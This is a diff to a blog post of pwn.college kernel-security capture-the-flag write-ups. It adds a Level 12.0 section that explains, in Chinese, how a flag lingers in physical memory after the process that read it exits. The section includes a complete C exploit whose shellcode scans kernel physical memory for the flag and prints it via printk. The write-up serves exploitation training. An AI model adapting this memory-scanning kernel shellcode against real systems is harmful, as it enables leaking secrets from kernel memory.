@@ -1,5 +1,5 @@
 ---
-title: "Write-ups: System Security (Kernel Security) series"
+title: "Write-ups: System Security (Kernel Security) series (Completed)"
 published: 2025-12-19
 updated: 2026-01-05
 description: "Write-ups for pwn.college kernel exploitation series."
@@ -1019,6 +1019,115 @@ int main(void) {
 
   patch(sc, sc_size, marker, strlen(marker), real_path, strlen(real_path));
   sendline(t, sc, sc_size);
+
+  return 0;
+}
+```
+
+# Level 12.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Exploit a kernel device utilizing a userspace binary, with a twist!
+
+## Write-up
+
+这题和上题的区别在于，fork 出来的子进程读取完 flag 后直接退出了，这样一来子进程的页表映射就被销毁了，我们无法再通过 `/proc/pid/mem` 的方式访问到子进程的内存空间。
+
+但销毁只是把用户态的页表映射移除，并不是说会将它使用过的物理内存空间也擦除，不然开销太大了。所以我们可以侧信道遍历内核物理地址空间找到 flag，前提是期间没有被其它运行过的程序破坏原先 flag 在内核物理地址空间的残留。
+
+```c
+__pid_t load_flag()
+{
+  int fd; // [rsp+Ch] [rbp-4h]
+
+  puts("Attempting to load the flag into memory.\n");
+  if ( !fork() )
+  {
+    fd = open("/flag", 0);
+    if ( fd < 0 )
+      exit(1);
+    read(fd, &flag_23549, 0x100u);
+    close(fd);
+    exit(0);
+  }
+  return wait(0);
+}
+```
+
+<center>
+  <img src="https://cdn.cubeyond.net/gh/CuB3y0nd/picx-images-hosting@master/.232coxtja2.avif" alt="" />
+</center>
+
+## Exploit
+
+```c
+#include "axium/tubes/process.h"
+#include "axium/tubes/tube.h"
+#include <stdio.h>
+#include <string.h>
+
+#define PACKED __attribute__((packed))
+#define NAKED __attribute__((naked))
+
+#define STR(x) #x
+#define XSTR(x) STR(x)
+
+#define TIF_SECCOMP 8
+#define PAGE_OFFSET 0xffff888000000000
+
+NAKED void shellcode(void) {
+  __asm__ volatile(
+      ".intel_syntax noprefix;"
+      ".global sc_start;"
+      ".global sc_end;"
+      "sc_start:;"
+
+      "mov rdi, 0x3;"
+      "lea rsi, [rip + side_channel_start];"
+      "mov rdx, side_channel_end - side_channel_start;"
+      "mov rax, 0x1;"
+      "syscall;" // write(0x3, side_channel_start, sizeof(side_channel))
+
+      "side_channel_start:;"
+      "mov rdi, " XSTR(PAGE_OFFSET) ";"
+                                    "mov rbx, [rip + mark];"
+                                    "loop:;"
+                                    "cmp rbx, [rdi];"
+                                    "je print;"
+                                    "inc rdi;"
+                                    "jmp loop;"
+
+                                    "print:"
+                                    "push rdi;"
+                                    "mov rax, 0xffffffff810b69a9;"
+                                    "call rax;" // printk
+                                    "pop rdi;"
+                                    "inc rdi;"
+                                    "jmp loop;"
+                                    "ret;"
+
+                                    "mark: .ascii \"college{\";"
+                                    "side_channel_end:;"
+
+                                    "sc_end:;"
+                                    ".att_syntax;");
+}
+
+extern char sc_start[];
+extern char sc_end[];
+
+int main(void) {
+  char *const challenge_argv[] = {"/challenge/babykernel_level12.0", NULL};
+  tube *t = process_ext(challenge_argv, NULL, TUBE_STDIN);
+
+  size_t sc_size = sc_end - sc_start;
+
+  sendline(t, sc_start, sc_size);
 
   return 0;
 }
